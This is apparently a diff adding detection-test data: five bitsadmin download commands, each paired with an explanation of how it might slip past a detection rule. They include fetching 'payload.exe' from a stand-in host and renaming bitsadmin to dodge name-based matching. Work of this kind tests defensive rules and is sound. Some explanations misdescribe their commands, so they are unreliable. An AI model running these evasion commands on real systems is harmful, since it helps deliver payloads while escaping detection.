@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\bitsadmin.exe\" /transfer MyJob /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
+    "explanation": "Inserted quotes around the path and added an extra space after /transfer to test if the rule detects based on exact string matching."
+  },
+  {
+    "output": "bitsadmin.exe /addfile MyJob https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "Removed the job name 'AtomicBITS' as it is optional and reordered the command line to test if the rule is sensitive to argument order."
+  },
+  {
+    "output": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+    "explanation": "Reordered the flags and used full path for the executable to test if the rule is sensitive to path normalization or argument order."
+  },
+  {
+    "output": "bitsadmin.exe /transfer MyJob http://example.com/payload.exe payload.exe",
+    "explanation": "Used a shorter HTTP URL and omitted unnecessary parameters to test if the rule is sensitive to specific URL patterns or parameters."
+  },
+  {
+    "output": "copy bitsadmin.exe not_bits.exe && not_bits.exe /transfer MyJob http://example.com/payload.exe payload.exe",
+    "explanation": "Renamed the executable and used it with a renamed copy to test if the rule is sensitive to the executable name or path."
+  }
+]
